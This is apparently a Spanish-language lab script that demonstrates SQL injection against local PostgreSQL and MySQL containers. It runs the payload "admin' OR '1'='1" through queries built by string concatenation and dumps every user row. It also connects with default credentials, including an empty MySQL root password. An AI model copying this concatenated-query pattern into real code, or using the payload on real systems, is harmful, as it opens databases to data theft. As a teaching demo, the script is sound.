import psycopg2, pymysql, time, sys

print("Iniciando prueba de Inyección SQL...")
time.sleep(2)

try:
    pg = psycopg2.connect(host="postgres", dbname="postgres", user="postgres", password="postgres")
    my = pymysql.connect(host="mysql", user="root", password="", database="tienda", autocommit=True)
    
    # ❌ PAYLOAD MALICIOSO (SQLi)
    # Al concatenarse, la consulta quedará: WHERE nombre='admin' OR '1'='1';
    nombre = "admin' OR '1'='1" 
    
    print(f"\n[POSTGRESQL] Ejecutando SQLi con payload: {nombre}")
    cur_pg = pg.cursor()
    cur_pg.execute(f"SELECT id,nombre FROM usuarios WHERE nombre='{nombre}';")
    print("RESULTADO SQLi (Todos los usuarios expuestos):")
    print(cur_pg.fetchall())

    print(f"\n[MYSQL] Ejecutando SQLi con payload: {nombre}")
    cur_my = my.cursor()
    cur_my.execute(f"SELECT id,nombre FROM usuarios WHERE nombre='{nombre}';")
    print("RESULTADO SQLi (Todos los usuarios expuestos):")
    print(cur_my.fetchall())

    while True:
        time.sleep(60)
except Exception as e:
    print(e)
    sys.exit(1)
